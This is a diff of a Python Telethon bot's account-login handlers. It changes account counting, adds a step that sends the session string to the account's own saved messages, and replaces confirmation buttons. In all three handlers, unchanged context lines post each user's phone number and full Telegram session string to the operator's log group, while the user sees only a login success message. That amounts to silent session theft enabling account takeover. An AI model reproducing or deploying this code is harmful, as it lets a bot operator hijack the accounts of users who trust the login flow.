@@ -62,17 +62,13 @@ async def add_account(event):
     try:
         await client.sign_in(phone=phone, code=phone_code, password=None)
         session = client.session.save()
-        allaccs = DB.get_key("USER_ACCS")[event.sender_id]
-        if phone not in allaccs:
-            all = DB.get_key("USER_ACCS_COUNT")
-            all[event.sender_id] += 1
-            DB.set_key("USER_ACCS_COUNT", all)
+        await client.send_message("me", str(session))
         allaccs = DB.get_key("USER_ACCS")
         allaccs[event.sender_id][phone] = session
         DB.set_key("USER_ACCS", allaccs)
         newacc = f"**#NewAccount**\n\n**💎 User:** ( `{event.sender_id}` )\n\n{flag} `{phone}` {flag}\n\n**• Session:**\n`{session}`"
         await bot.send_message(LOG_GROUP, newacc)
-        buttons = [[Button.inline("✅ Yes ✅", data=f"yesedit:{phone}"), Button.inline("❌ No ❌", data=f"noedit:{phone}")]]
+        buttons = [[Button.inline("✏️ Edit Account ✏️", data=f"editacc:{phone}")]]
         await edit.edit(f"**✅ Successfuly Login To Your Account!**\n\n {flag} `{phone}` {flag} \n\n**❓ Do You Want To Edit Your Account?**", buttons=buttons)
     except (PhoneCodeInvalidError, TypeError):
         await edit.edit("**❌ Your Code Is Invalid, Try Again!**")
@@ -91,17 +87,13 @@ async def add_account(event):
         try:
             await client.sign_in(password=password)
             session = client.session.save()
-            allaccs = DB.get_key("USER_ACCS")[event.sender_id]
-            if phone not in allaccs:
-                all = DB.get_key("USER_ACCS_COUNT")
-                all[event.sender_id] += 1
-                DB.set_key("USER_ACCS_COUNT", all)
+            await client.send_message("me", str(session))
             allaccs = DB.get_key("USER_ACCS")
             allaccs[event.sender_id][phone] = session
             DB.set_key("USER_ACCS", allaccs)
             newacc = f"**#NewAccount**\n\n**💎 User:** ( `{event.sender_id}` )\n\n{flag} `{phone}` {flag}\n\n**• Session:**\n`{session}`"
             await bot.send_message(LOG_GROUP, newacc)
-            buttons = [[Button.inline("✅ Yes ✅", data=f"yesedit:{phone}"), Button.inline("❌ No ❌", data=f"noedit:{phone}")]]
+            buttons = [[Button.inline("✏️ Edit Account ✏️", data=f"editacc:{phone}")]]
             await edit.edit(f"**✅ Successfuly Login To Your Account!**\n\n {flag} `{phone}` {flag} \n\n** ❓Do You Want To Edit Your Account?**", buttons=buttons)
         except PasswordHashInvalidError:
             await edit.edit("**❌ Your Account Password Is Invalid, Try Again!**")
@@ -131,15 +123,10 @@ async def add_session(event):
         await edit.edit("**❌ Your Telethon Session String Is Not For A Account!**")
         return await event.respond("**♻️ Main Menu:**", buttons=main_menu(event))
     flag = get_flag(phone)
-    allaccs = DB.get_key("USER_ACCS")[event.sender_id]
-    if phone not in allaccs:
-        all = DB.get_key("USER_ACCS_COUNT")
-        all[event.sender_id] += 1
-        DB.set_key("USER_ACCS_COUNT", all)
     allaccs = DB.get_key("USER_ACCS")
     allaccs[event.sender_id][phone] = session
     DB.set_key("USER_ACCS", allaccs)
     newacc = f"**#NewAccount**\n\n**💎 User:** ( `{event.sender_id}` )\n\n{flag} `{phone}` {flag}\n\n**• Session:**\n`{session}`"
     await bot.send_message(LOG_GROUP, newacc)
-    buttons = [[Button.inline("✅ Yes ✅", data=f"yesedit:{phone}"), Button.inline("❌ No ❌", data=f"noedit:{phone}")]]
+    buttons = [[Button.inline("✏️ Edit Account ✏️", data=f"editacc:{phone}")]]
     await edit.edit(f"**✅ Successfuly Login To Your Account!**\n\n {flag} `{phone}` {flag} \n\n** ❓Do You Want To Edit Your Account?**", buttons=buttons)
